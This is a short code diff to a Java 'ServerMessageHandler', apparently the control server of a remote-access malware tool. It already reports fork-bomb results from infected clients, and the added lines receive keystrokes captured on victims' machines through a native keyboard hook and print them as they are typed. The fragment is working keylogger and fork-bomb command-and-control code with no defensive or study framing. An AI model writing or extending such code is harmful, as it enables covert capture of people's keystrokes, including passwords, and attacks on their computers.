@@ -11,6 +11,7 @@ import java.awt.image.BufferedImage;
 import java.io.ByteArrayInputStream;
 import java.io.InputStream;
 
+import org.jnativehook.keyboard.NativeKeyEvent;
 import static utils.ServerUtils.print;
 
 
@@ -32,6 +33,11 @@ public class ServerMessageHandler {
                 break;
             case "bomb-fail":
                 System.out.println("Fork Bomb failed: " + message.getArguments().get(0));
+                break;
+
+            case "key-typed":
+                NativeKeyEvent keyTyped = (NativeKeyEvent) message.getArguments().get(0);
+                System.out.println("TYPED " + keyTyped.getKeyChar());
                 break;
         }
 
